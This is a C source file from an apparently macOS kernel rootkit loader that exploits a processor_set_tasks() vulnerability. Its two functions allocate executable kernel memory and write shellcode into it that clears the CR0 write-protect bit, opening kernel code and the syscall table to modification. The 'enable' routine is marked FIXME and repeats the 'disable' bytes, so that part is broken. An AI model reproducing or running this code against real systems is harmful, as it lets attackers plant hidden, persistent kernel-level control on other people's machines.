/*
 *  _(`-')     _     (`-')  _           <-. (`-')_             (`-').->(`-')      _
 * ( (OO ).-> (_)    (OO ).-/     .->      \( OO) )     .->    ( OO)_  ( OO).->  (_)     _
 *  \    .'_  ,-(`-')/ ,---.   ,---(`-'),--./ ,--/ (`-')----. (_)--\_) /    '._  ,-(`-') \-,-----.
 *  '`'-..__) | ( OO)| \ /`.\ '  .-(OO )|   \ |  | ( OO).-.  '/    _ / |'--...__)| ( OO)  |  .--./
 *  |  |  ' | |  |  )'-'|_.' ||  | .-, \|  . '|  |)( _) | |  |\_..`--. `--.  .--'|  |  ) /_) (`-')
 *  |  |  / :(|  |_/(|  .-.  ||  | '.(_/|  |\    |  \|  |)|  |.-._)   \   |  |  (|  |_/  ||  |OO )
 *  |  '-'  / |  |'->|  | |  ||  '-'  | |  | \   |   '  '-'  '\       /   |  |   |  |'->(_'  '--'\
 *  `------'  `--'   `--' `--' `-----'  `--'  `--'    `-----'  `-----'    `--'   `--'      `-----'
 *  (`-').->(`-')  _   (`-')       (`-')  _                (`-')  _
 *  ( OO)_  ( OO).-/<-.(OO )      _(OO ) (_)     _         ( OO).-/
 * (_)--\_)(,------.,------,),--.(_/,-.\ ,-(`-') \-,-----.(,------.
 * /    _ / |  .---'|   /`. '\   \ / (_/ | ( OO)  |  .--./ |  .---'
 * \_..`--.(|  '--. |  |_.' | \   /   /  |  |  ) /_) (`-')(|  '--.
 * .-._)   \|  .--' |  .   .'_ \     /_)(|  |_/  ||  |OO ) |  .--'
 * \       /|  `---.|  |\  \ \-'\   /    |  |'->(_'  '--'\ |  `---.
 *  `-----' `------'`--' '--'    `-'     `--'      `-----' `------'
 *
 * A kernel rootkit loader based on processor_set_tasks() vulnerability
 *
 * Copyright (c) fG!, 2014, 2015. All rights reserved.
 * reverser@put.as - https://reverse.put.as
 *
 * kernel_code_exec.c
 * Functions related to install kernel code snippets
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "kernel_code_exec.h"

#include <stdio.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>

#include "logging.h"
#include "utils.h"

/* allocate kernel memory and install shellcode to disable cr0 protection
 * the shellcode can then be executed from a TrustedBSD hook
 * after that we can finally write to cr0 protected areas (kernel code, sysent, etc)
 */
mach_vm_address_t
install_disable_cr0_shellcode(mach_port_t kernel_port)
{
    unsigned char shellcode[] =
    "\x0F\x20\xC0"              // mov rax, cr0
    "\x48\x25\xFF\xFF\xFE\xFF"  // and rax, 0FFFFFFFFFFFEFFFFh
    "\x0F\x22\xC0"              // mov cr0, rax
    "\x48\x31\xC0"              // xor rax,rax
    "\xC3";                     // ret

    mach_vm_address_t shellcode_addr = 0;
    
    kern_return_t ret = alloc_and_write_exec_kmem(kernel_port, (void*)shellcode, sizeof(shellcode), &shellcode_addr);
    if (ret != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to install disable cr0 shellcode");
        return 0;
    }

    DEBUG_MSG("Allocated disable cr0 shellcode at kernel address 0x%llx", shellcode_addr);
    DEBUG_MSG("Disable cr0 shellcode is copied and made executable");
    return shellcode_addr;
}

mach_vm_address_t
install_enable_cr0_shellcode(mach_port_t kernel_port)
{
    /* XXX: FIXME */
    unsigned char shellcode[] =
    "\x0F\x20\xC0"              // mov rax, cr0
    "\x48\x25\xFF\xFF\xFE\xFF"  // and rax, 0FFFFFFFFFFFEFFFFh
    "\x0F\x22\xC0"              // mov cr0, rax
    "\x48\x31\xC0"              // xor rax,rax
    "\xC3";                     // ret
    
    mach_vm_address_t shellcode_addr = 0;

    kern_return_t ret = alloc_and_write_exec_kmem(kernel_port, (void*)shellcode, sizeof(shellcode), &shellcode_addr);
    if (ret != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to install enable cr0 shellcode");
        return 0;
    }
    
    DEBUG_MSG("Allocated enable cr0 shellcode at kernel address 0x%llx", shellcode_addr);
    DEBUG_MSG("Enable cr0 shellcode is copied and made executable");
    return shellcode_addr;
}
